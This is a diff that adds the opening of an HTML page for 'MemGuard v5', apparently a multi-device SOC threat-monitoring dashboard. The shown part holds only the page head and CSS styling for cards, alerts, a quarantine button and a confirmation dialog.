@@ -1,0 +1,4009 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="MemGuard v5 SOC Multi-Device Real-Time EDR Telemetry & Threat Analysis Engine">
+    <title>MemGuard v5 | Multi-Device SOC Threat Command</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Outfit:wght@300;400;500;600;700;800&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --bg-deep: #070a12;
+            --bg-card: rgba(13, 20, 36, 0.72);
+            --bg-card-hover: rgba(18, 28, 51, 0.85);
+            --bg-input: rgba(11, 17, 31, 0.85);
+            --border-subtle: rgba(56, 189, 248, 0.12);
+            --border-glow: rgba(56, 189, 248, 0.35);
+            --text-primary: #f8fafc;
+            --text-secondary: #94a3b8;
+            --text-muted: #64748b;
+            --accent-cyan: #00f2fe;
+            --accent-blue: #38bdf8;
+            --accent-emerald: #10b981;
+            --accent-amber: #f59e0b;
+            --accent-crimson: #ef4444;
+            --accent-purple: #8b5cf6;
+            --accent-indigo: #6366f1;
+            --danger-glow: rgba(239, 68, 68, 0.25);
+            --safe-glow: rgba(16, 185, 129, 0.2);
+            --radius-lg: 16px;
+            --radius-md: 10px;
+            --radius-sm: 6px;
+            --transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Outfit', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: var(--bg-deep);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+            background-image:
+                radial-gradient(circle at 10% 15%, rgba(14, 165, 233, 0.08) 0%, transparent 40%),
+                radial-gradient(circle at 90% 85%, rgba(239, 68, 68, 0.05) 0%, transparent 45%),
+                linear-gradient(rgba(255, 255, 255, 0.015) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.015) 1px, transparent 1px);
+            background-size: 100% 100%, 100% 100%, 36px 36px, 36px 36px;
+        }
+
+        .mono {
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        /* Scrollbars */
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(7, 10, 18, 0.6);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: rgba(56, 189, 248, 0.25);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(56, 189, 248, 0.45);
+        }
+
+        .app-container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 1.25rem 1.5rem 3rem 1.5rem;
+        }
+
+        /* Top Bar */
+        .top-navbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 1rem 1.5rem;
+            background: var(--bg-card);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-lg);
+            margin-bottom: 1.25rem;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .brand-section {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .brand-logo {
+            width: 44px;
+            height: 44px;
+            background: linear-gradient(135deg, rgba(0, 242, 254, 0.15), rgba(56, 189, 248, 0.05));
+            border: 1px solid rgba(0, 242, 254, 0.3);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 15px rgba(0, 242, 254, 0.25);
+            flex-shrink: 0;
+        }
+
+        .brand-logo svg {
+            width: 24px;
+            height: 24px;
+            fill: none;
+            stroke: var(--accent-cyan);
+            stroke-width: 2;
+        }
+
+        .brand-title h1 {
+            font-size: 1.35rem;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            background: linear-gradient(120deg, #ffffff 30%, var(--accent-cyan) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+
+        .brand-badge {
+            font-size: 0.65rem;
+            font-weight: 700;
+            padding: 0.2rem 0.5rem;
+            background: rgba(0, 242, 254, 0.1);
+            color: var(--accent-cyan);
+            border: 1px solid rgba(0, 242, 254, 0.25);
+            border-radius: 4px;
+            letter-spacing: 0.05em;
+            text-transform: uppercase;
+        }
+
+        .brand-subtitle {
+            font-size: 0.78rem;
+            color: var(--text-secondary);
+        }
+
+        .telemetry-meta {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            flex-wrap: wrap;
+        }
+
+        .meta-pill {
+            display: flex;
+            align-items: center;
+            gap: 0.45rem;
+            font-size: 0.75rem;
+            padding: 0.35rem 0.8rem;
+            background: rgba(11, 17, 31, 0.65);
+            border: 1px solid var(--border-subtle);
+            border-radius: 20px;
+            color: var(--text-secondary);
+        }
+
+        .meta-pill strong {
+            color: var(--text-primary);
+        }
+
+        .pulse-indicator {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background-color: var(--accent-emerald);
+            box-shadow: 0 0 10px var(--accent-emerald);
+            animation: pulse-glow 2s infinite ease-in-out;
+            flex-shrink: 0;
+        }
+
+        .pulse-indicator.threat {
+            background-color: var(--accent-crimson);
+            box-shadow: 0 0 12px var(--accent-crimson);
+            animation: pulse-threat 1s infinite alternate;
+        }
+
+        .pulse-indicator.ws-active {
+            background-color: var(--accent-cyan);
+            box-shadow: 0 0 10px var(--accent-cyan);
+        }
+
+        @keyframes pulse-glow {
+
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+
+            50% {
+                opacity: 0.4;
+                transform: scale(0.85);
+            }
+        }
+
+        @keyframes pulse-threat {
+            0% {
+                opacity: 1;
+                transform: scale(1);
+                box-shadow: 0 0 8px var(--accent-crimson);
+            }
+
+            100% {
+                opacity: 0.6;
+                transform: scale(1.3);
+                box-shadow: 0 0 16px var(--accent-crimson);
+            }
+        }
+
+        .action-cluster {
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+            flex-wrap: wrap;
+        }
+
+        /* Buttons */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.45rem;
+            padding: 0.55rem 1.1rem;
+            border-radius: var(--radius-md);
+            font-size: 0.82rem;
+            font-weight: 600;
+            cursor: pointer;
+            border: 1px solid transparent;
+            transition: var(--transition);
+            font-family: inherit;
+            white-space: nowrap;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #0284c7, #0369a1);
+            color: #ffffff;
+            border-color: rgba(56, 189, 248, 0.3);
+            box-shadow: 0 4px 16px rgba(2, 132, 199, 0.35);
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #0ea5e9, #0284c7);
+            box-shadow: 0 6px 20px rgba(2, 132, 199, 0.5);
+            transform: translateY(-1px);
+        }
+
+        .btn-outline {
+            background: rgba(15, 23, 42, 0.7);
+            color: var(--text-primary);
+            border-color: var(--border-subtle);
+        }
+
+        .btn-outline:hover {
+            background: rgba(30, 41, 59, 0.8);
+            border-color: var(--border-glow);
+            transform: translateY(-1px);
+        }
+
+        .btn-danger-outline {
+            background: rgba(239, 68, 68, 0.08);
+            color: #fca5a5;
+            border-color: rgba(239, 68, 68, 0.25);
+        }
+
+        .btn-danger-outline:hover {
+            background: rgba(239, 68, 68, 0.18);
+            border-color: var(--accent-crimson);
+            box-shadow: 0 0 12px rgba(239, 68, 68, 0.3);
+        }
+
+        .btn-success-outline {
+            background: rgba(16, 185, 129, 0.08);
+            color: #6ee7b7;
+            border-color: rgba(16, 185, 129, 0.25);
+        }
+
+        .btn-success-outline:hover {
+            background: rgba(16, 185, 129, 0.18);
+            border-color: var(--accent-emerald);
+        }
+
+        .btn-icon-only {
+            padding: 0.55rem;
+            border-radius: var(--radius-md);
+            background: rgba(15, 23, 42, 0.7);
+            border: 1px solid var(--border-subtle);
+            color: var(--text-secondary);
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .btn-icon-only:hover {
+            color: var(--text-primary);
+            border-color: var(--border-glow);
+        }
+
+        /* Live Alert Notification Banner */
+        .threat-alert-banner {
+            display: none;
+            align-items: center;
+            justify-content: space-between;
+            background: linear-gradient(90deg, rgba(239, 68, 68, 0.22), rgba(185, 28, 28, 0.12));
+            border: 1px solid rgba(239, 68, 68, 0.45);
+            padding: 0.85rem 1.25rem;
+            border-radius: var(--radius-md);
+            margin-bottom: 1.25rem;
+            box-shadow: 0 0 25px rgba(239, 68, 68, 0.2);
+            animation: banner-glow 2s infinite alternate;
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+
+        @keyframes banner-glow {
+            from {
+                border-color: rgba(239, 68, 68, 0.35);
+            }
+
+            to {
+                border-color: rgba(239, 68, 68, 0.7);
+            }
+        }
+
+        .threat-alert-banner.active {
+            display: flex;
+        }
+
+        .alert-left {
+            display: flex;
+            align-items: center;
+            gap: 0.85rem;
+        }
+
+        .alert-icon-box {
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+            background: rgba(239, 68, 68, 0.2);
+            border: 1px solid var(--accent-crimson);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent-crimson);
+            flex-shrink: 0;
+        }
+
+        .alert-text h3 {
+            font-size: 0.92rem;
+            font-weight: 700;
+            color: #fee2e2;
+        }
+
+        .alert-text p {
+            font-size: 0.78rem;
+            color: #fca5a5;
+        }
+
+        /* Adaptive System Scan Controller & Machine Baseline Toolbar */
+        .system-control-strip {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: rgba(13, 20, 36, 0.75);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-md);
+            padding: 0.65rem 1rem;
+            margin-bottom: 1.25rem;
+            backdrop-filter: blur(10px);
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .control-strip-left {
+            display: flex;
+            align-items: center;
+            gap: 1.25rem;
+            flex-wrap: wrap;
+        }
+
+        .control-strip-right {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            flex-wrap: wrap;
+        }
+
+        .control-group {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .control-label {
+            font-size: 0.72rem;
+            color: var(--text-muted);
+            font-weight: 600;
+            letter-spacing: 0.05em;
+        }
+
+        .control-select {
+            background: rgba(7, 10, 18, 0.85);
+            border: 1px solid rgba(56, 189, 248, 0.25);
+            border-radius: 6px;
+            color: #f1f5f9;
+            padding: 0.35rem 0.65rem;
+            font-size: 0.78rem;
+            font-family: inherit;
+            outline: none;
+            transition: var(--transition);
+            cursor: pointer;
+        }
+
+        .control-select:focus {
+            border-color: var(--accent-cyan);
+            box-shadow: 0 0 10px rgba(0, 242, 254, 0.2);
+        }
+
+        .baseline-status-pill {
+            display: flex;
+            align-items: center;
+            gap: 0.45rem;
+            padding: 0.32rem 0.65rem;
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.25);
+            border-radius: 20px;
+            font-size: 0.74rem;
+            font-family: 'JetBrains Mono', monospace;
+            color: var(--accent-emerald);
+        }
+
+        /* Navigation Tabs */
+        .nav-tabs {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            margin-bottom: 1.25rem;
+            border-bottom: 1px solid var(--border-subtle);
+            padding-bottom: 0.4rem;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .tab-btn {
+            background: transparent;
+            border: none;
+            color: var(--text-secondary);
+            padding: 0.55rem 1rem;
+            border-radius: var(--radius-md);
+            font-size: 0.84rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 0.45rem;
+            white-space: nowrap;
+        }
+
+        .tab-btn:hover {
+            color: var(--text-primary);
+            background: rgba(255, 255, 255, 0.04);
+        }
+
+        .tab-btn.active {
+            color: var(--accent-cyan);
+            background: rgba(0, 242, 254, 0.08);
+            border: 1px solid rgba(0, 242, 254, 0.2);
+            font-weight: 600;
+        }
+
+        .tab-badge {
+            font-size: 0.7rem;
+            padding: 0.15rem 0.45rem;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.08);
+            color: inherit;
+        }
+
+        .tab-btn.active .tab-badge {
+            background: rgba(0, 242, 254, 0.2);
+        }
+
+        /* Stat Grid (Ribbon) */
+        .stat-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 1.1rem;
+            margin-bottom: 1.25rem;
+        }
+
+        .stat-card {
+            background: var(--bg-card);
+            backdrop-filter: blur(16px);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-lg);
+            padding: 1.25rem;
+            position: relative;
+            overflow: hidden;
+            transition: var(--transition);
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: transparent;
+            transition: var(--transition);
+        }
+
+        .stat-card:hover {
+            transform: translateY(-2px);
+            border-color: var(--border-glow);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.25);
+        }
+
+        .stat-card.risk-card::before {
+            background: linear-gradient(90deg, var(--accent-emerald), var(--accent-cyan));
+        }
+
+        .stat-card.risk-card.elevated::before {
+            background: linear-gradient(90deg, var(--accent-amber), #ea580c);
+        }
+
+        .stat-card.risk-card.critical::before {
+            background: linear-gradient(90deg, var(--accent-crimson), #b91c1c);
+        }
+
+        .stat-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 0.65rem;
+        }
+
+        .stat-label {
+            font-size: 0.76rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            color: var(--text-secondary);
+        }
+
+        .stat-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 8px;
+            background: rgba(56, 189, 248, 0.08);
+            border: 1px solid rgba(56, 189, 248, 0.15);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent-blue);
+        }
+
+        .stat-value {
+            font-size: 2.1rem;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            line-height: 1.1;
+            margin-bottom: 0.35rem;
+        }
+
+        .stat-subtext {
+            font-size: 0.74rem;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            gap: 0.35rem;
+        }
+
+        .risk-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.35rem;
+            padding: 0.25rem 0.65rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 700;
+            letter-spacing: 0.05em;
+            text-transform: uppercase;
+        }
+
+        .risk-badge.low {
+            background: rgba(16, 185, 129, 0.15);
+            color: var(--accent-emerald);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            box-shadow: 0 0 15px var(--safe-glow);
+        }
+
+        .risk-badge.medium {
+            background: rgba(245, 158, 11, 0.15);
+            color: var(--accent-amber);
+            border: 1px solid rgba(245, 158, 11, 0.3);
+        }
+
+        .risk-badge.high,
+        .risk-badge.critical {
+            background: rgba(239, 68, 68, 0.18);
+            color: var(--accent-crimson);
+            border: 1px solid rgba(239, 68, 68, 0.4);
+            box-shadow: 0 0 15px var(--danger-glow);
+            animation: pulse-threat 1.5s infinite alternate;
+        }
+
+        /* Two-Column Grid */
+        .workspace-grid {
+            display: grid;
+            grid-template-columns: 1.8fr 1.2fr;
+            gap: 1.25rem;
+        }
+
+        .panel-box {
+            background: var(--bg-card);
+            backdrop-filter: blur(16px);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-lg);
+            padding: 1.35rem;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
+        }
+
+        .panel-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 1.1rem;
+            padding-bottom: 0.65rem;
+            border-bottom: 1px solid var(--border-subtle);
+            flex-wrap: wrap;
+            gap: 0.6rem;
+        }
+
+        .panel-title {
+            font-size: 1rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 0.55rem;
+            color: var(--text-primary);
+        }
+
+        .panel-title svg {
+            width: 18px;
+            height: 18px;
+            color: var(--accent-cyan);
+            flex-shrink: 0;
+        }
+
+        /* FLEET MANAGEMENT STYLES */
+        .fleet-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
+            gap: 1rem;
+            margin-top: 0.75rem;
+        }
+
+        .device-card {
+            background: rgba(14, 21, 38, 0.75);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-md);
+            padding: 1.15rem;
+            transition: var(--transition);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .device-card:hover {
+            border-color: var(--border-glow);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+        }
+
+        .device-card.compromised {
+            border-color: rgba(239, 68, 68, 0.45);
+            background: rgba(30, 16, 25, 0.75);
+            box-shadow: 0 0 18px rgba(239, 68, 68, 0.15);
+        }
+
+        .device-card-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 0.75rem;
+        }
+
+        .device-type-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.35rem;
+            padding: 0.2rem 0.55rem;
+            border-radius: 4px;
+            font-size: 0.68rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .type-windows {
+            background: rgba(56, 189, 248, 0.12);
+            color: var(--accent-blue);
+            border: 1px solid rgba(56, 189, 248, 0.25);
+        }
+
+        .type-android {
+            background: rgba(16, 185, 129, 0.12);
+            color: var(--accent-emerald);
+            border: 1px solid rgba(16, 185, 129, 0.25);
+        }
+
+        .type-linux {
+            background: rgba(245, 158, 11, 0.12);
+            color: var(--accent-amber);
+            border: 1px solid rgba(245, 158, 11, 0.25);
+        }
+
+        .type-macos {
+            background: rgba(168, 85, 247, 0.12);
+            color: var(--accent-purple);
+            border: 1px solid rgba(168, 85, 247, 0.25);
+        }
+
+        .type-web {
+            background: rgba(0, 242, 254, 0.12);
+            color: var(--accent-cyan);
+            border: 1px solid rgba(0, 242, 254, 0.25);
+        }
+
+        .device-name {
+            font-size: 0.95rem;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 0.2rem;
+        }
+
+        .device-ip {
+            font-size: 0.74rem;
+            color: var(--text-muted);
+            margin-bottom: 0.65rem;
+        }
+
+        .device-risk-track {
+            height: 6px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 0.4rem 0 0.8rem 0;
+        }
+
+        .device-risk-fill {
+            height: 100%;
+            border-radius: 3px;
+            transition: width 0.4s ease;
+        }
+
+        .device-actions {
+            display: flex;
+            gap: 0.45rem;
+            margin-top: 0.75rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            padding-top: 0.65rem;
+            flex-wrap: wrap;
+        }
+
+        /* Threat Report Viewer Styles */
+        .report-dossier {
+            background: rgba(10, 15, 28, 0.9);
+            border: 1px solid var(--border-glow);
+            border-radius: var(--radius-md);
+            padding: 1.5rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1.25rem;
+        }
+
+        .dossier-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            border-bottom: 1px solid var(--border-subtle);
+            padding-bottom: 1rem;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .dossier-title h2 {
+            font-size: 1.25rem;
+            font-weight: 800;
+            color: var(--text-primary);
+        }
+
+        .dossier-meta {
+            font-size: 0.76rem;
+            color: var(--text-secondary);
+            margin-top: 0.25rem;
+        }
+
+        .dossier-exec-summary {
+            background: rgba(15, 23, 42, 0.75);
+            border-left: 4px solid var(--accent-cyan);
+            border-radius: 0 var(--radius-sm) var(--radius-sm) 0;
+            padding: 1rem;
+            font-size: 0.84rem;
+            line-height: 1.55;
+            color: #cbd5e1;
+        }
+
+        .recommendation-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 0.75rem;
+        }
+
+        .rec-item {
+            background: rgba(15, 23, 42, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: var(--radius-sm);
+            padding: 0.75rem;
+            font-size: 0.78rem;
+        }
+
+        .rec-badge {
+            font-size: 0.68rem;
+            font-weight: 700;
+            padding: 0.15rem 0.45rem;
+            border-radius: 3px;
+            display: inline-block;
+            margin-bottom: 0.35rem;
+        }
+
+        .rec-p1 {
+            background: rgba(239, 68, 68, 0.2);
+            color: #f87171;
+        }
+
+        .rec-p2 {
+            background: rgba(245, 158, 11, 0.2);
+            color: #fbbf24;
+        }
+
+        .rec-p3 {
+            background: rgba(56, 189, 248, 0.2);
+            color: #7dd3fc;
+        }
+
+        /* Threat Cards */
+        .threat-list-container {
+            display: flex;
+            flex-direction: column;
+            gap: 0.85rem;
+            max-height: 520px;
+            overflow-y: auto;
+            padding-right: 0.25rem;
+        }
+
+        .threat-card {
+            background: rgba(18, 25, 43, 0.75);
+            border: 1px solid rgba(239, 68, 68, 0.25);
+            border-left: 4px solid var(--accent-crimson);
+            border-radius: var(--radius-md);
+            padding: 1.1rem;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .threat-card:hover {
+            border-color: rgba(239, 68, 68, 0.5);
+            box-shadow: 0 6px 20px rgba(239, 68, 68, 0.15);
+            background: rgba(23, 32, 54, 0.85);
+        }
+
+        /* Threat card containment animation */
+        .threat-card.being-contained {
+            animation: containment-flash 0.4s ease forwards;
+            pointer-events: none;
+        }
+
+        @keyframes containment-flash {
+            0%   { opacity: 1; transform: scale(1); border-color: rgba(239,68,68,0.6); }
+            40%  { opacity: 1; transform: scale(1.01); background: rgba(16,185,129,0.12); border-color: rgba(16,185,129,0.6); box-shadow: 0 0 30px rgba(16,185,129,0.25); }
+            100% { opacity: 0; transform: scale(0.96) translateX(20px); height: 0; padding: 0; margin: 0; border-width: 0; }
+        }
+
+        .threat-card-top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 0.45rem;
+        }
+
+        .threat-process-name {
+            font-size: 0.95rem;
+            font-weight: 700;
+            color: #fee2e2;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .threat-score-pill {
+            font-size: 0.7rem;
+            font-weight: 700;
+            padding: 0.2rem 0.55rem;
+            border-radius: 4px;
+            background: rgba(239, 68, 68, 0.2);
+            color: #f87171;
+            border: 1px solid rgba(239, 68, 68, 0.35);
+        }
+
+        .threat-meta-row {
+            display: flex;
+            gap: 1.1rem;
+            font-size: 0.74rem;
+            color: var(--text-secondary);
+            margin-bottom: 0.55rem;
+            flex-wrap: wrap;
+        }
+
+        .threat-cmdline-box {
+            background: rgba(8, 12, 22, 0.9);
+            border: 1px solid rgba(255, 255, 255, 0.07);
+            border-radius: var(--radius-sm);
+            padding: 0.55rem 0.75rem;
+            font-size: 0.73rem;
+            color: #cbd5e1;
+            word-break: break-all;
+            margin-bottom: 0.6rem;
+        }
+
+        .mitre-tags-wrapper {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.35rem;
+            margin-bottom: 0.65rem;
+        }
+
+        .mitre-badge {
+            background: rgba(56, 189, 248, 0.08);
+            border: 1px solid rgba(56, 189, 248, 0.22);
+            color: #bae6fd;
+            font-size: 0.7rem;
+            padding: 0.16rem 0.45rem;
+            border-radius: 4px;
+        }
+
+        /* ── Terminate & Quarantine Button (premium) ── */
+        .btn-terminate {
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.45rem;
+            padding: 0.45rem 1rem;
+            font-size: 0.8rem;
+            font-weight: 700;
+            font-family: inherit;
+            cursor: pointer;
+            border-radius: 8px;
+            border: 1px solid rgba(239, 68, 68, 0.5);
+            background: linear-gradient(135deg, rgba(185, 28, 28, 0.25), rgba(239, 68, 68, 0.12));
+            color: #fca5a5;
+            letter-spacing: 0.02em;
+            overflow: hidden;
+            transition: all 0.18s ease;
+            box-shadow: 0 0 0 0 rgba(239, 68, 68, 0);
+        }
+
+        .btn-terminate::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(239, 68, 68, 0.18), transparent);
+            opacity: 0;
+            transition: opacity 0.18s ease;
+        }
+
+        .btn-terminate:hover {
+            border-color: rgba(239, 68, 68, 0.85);
+            background: linear-gradient(135deg, rgba(185, 28, 28, 0.45), rgba(239, 68, 68, 0.22));
+            color: #fee2e2;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 20px rgba(239, 68, 68, 0.35), 0 0 0 1px rgba(239, 68, 68, 0.2);
+        }
+
+        .btn-terminate:hover::before { opacity: 1; }
+
+        .btn-terminate:active {
+            transform: translateY(0);
+            box-shadow: 0 0 0 0 rgba(239, 68, 68, 0);
+        }
+
+        .btn-terminate.executing {
+            border-color: rgba(245, 158, 11, 0.6);
+            background: linear-gradient(135deg, rgba(120, 53, 15, 0.35), rgba(245, 158, 11, 0.12));
+            color: #fcd34d;
+            cursor: wait;
+            pointer-events: none;
+            animation: btn-executing-pulse 0.7s ease infinite alternate;
+        }
+
+        @keyframes btn-executing-pulse {
+            from { box-shadow: 0 0 8px rgba(245, 158, 11, 0.2); }
+            to   { box-shadow: 0 0 18px rgba(245, 158, 11, 0.5); }
+        }
+
+        .btn-terminate.success {
+            border-color: rgba(16, 185, 129, 0.6);
+            background: linear-gradient(135deg, rgba(6, 78, 59, 0.35), rgba(16, 185, 129, 0.12));
+            color: #6ee7b7;
+            pointer-events: none;
+        }
+
+        .btn-terminate.failed {
+            border-color: rgba(239, 68, 68, 0.5);
+            background: rgba(239, 68, 68, 0.08);
+            color: #f87171;
+            pointer-events: auto;
+            cursor: pointer;
+        }
+
+        /* ── EDR Inline Confirmation Modal ── */
+        .edr-confirm-backdrop {
+            position: fixed;
+            inset: 0;
+            background: rgba(5, 8, 16, 0.72);
+            backdrop-filter: blur(6px);
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.18s ease;
+        }
+
+        .edr-confirm-backdrop.visible {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .edr-confirm-box {
+            background: rgba(12, 18, 34, 0.97);
+            border: 1px solid rgba(239, 68, 68, 0.45);
+            border-top: 3px solid var(--accent-crimson);
+            border-radius: 14px;
+            padding: 1.75rem 2rem;
+            width: 440px;
+            max-width: 90vw;
+            box-shadow: 0 0 60px rgba(239, 68, 68, 0.2), 0 20px 50px rgba(0,0,0,0.6);
+            transform: scale(0.94) translateY(12px);
+            transition: transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .edr-confirm-backdrop.visible .edr-confirm-box {
+            transform: scale(1) translateY(0);
+        }
+
+        .edr-confirm-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            background: rgba(239, 68, 68, 0.15);
+            border: 1px solid rgba(239, 68, 68, 0.35);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1rem;
+            animation: edr-icon-pulse 1.2s ease infinite alternate;
+        }
+
+        @keyframes edr-icon-pulse {
+            from { box-shadow: 0 0 8px rgba(239,68,68,0.2); }
+            to   { box-shadow: 0 0 22px rgba(239,68,68,0.5); }
+        }
+
+        .edr-confirm-title {
+            font-size: 1.05rem;
+            font-weight: 800;
+            color: #fee2e2;
+            margin-bottom: 0.35rem;
+            letter-spacing: -0.01em;
+        }
+
+        .edr-confirm-subtitle {
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            margin-bottom: 0.85rem;
+            line-height: 1.5;
+        }
+
+        .edr-confirm-meta {
+            background: rgba(8, 12, 22, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 8px;
+            padding: 0.75rem 1rem;
+            margin-bottom: 1.25rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.78rem;
+        }
+
+        .edr-confirm-meta-row {
+            display: flex;
+            gap: 0.5rem;
+            color: var(--text-secondary);
+        }
+
+        .edr-confirm-meta-row strong {
+            color: #f87171;
+        }
+
+        .edr-confirm-meta-row span {
+            color: var(--text-muted);
+        }
+
+        .edr-confirm-actions {
+            display: flex;
+            gap: 0.65rem;
+        }
+
+        .edr-confirm-actions .btn-cancel {
+            flex: 1;
+            padding: 0.6rem;
+            font-size: 0.82rem;
+            font-weight: 600;
+            font-family: inherit;
+            border-radius: 8px;
+            border: 1px solid rgba(255,255,255,0.1);
+            background: rgba(15, 23, 42, 0.7);
+            color: var(--text-secondary);
+            cursor: pointer;
+            transition: all 0.15s ease;
+        }
+
+        .edr-confirm-actions .btn-cancel:hover {
+            background: rgba(30, 41, 59, 0.8);
+            color: var(--text-primary);
+        }
+
+        .edr-confirm-actions .btn-execute {
+            flex: 2;
+            padding: 0.6rem 1.2rem;
+            font-size: 0.84rem;
+            font-weight: 700;
+            font-family: inherit;
+            border-radius: 8px;
+            border: 1px solid rgba(239, 68, 68, 0.5);
+            background: linear-gradient(135deg, #b91c1c, #991b1b);
+            color: #fee2e2;
+            cursor: pointer;
+            letter-spacing: 0.02em;
+            transition: all 0.15s ease;
+            box-shadow: 0 4px 16px rgba(185, 28, 28, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
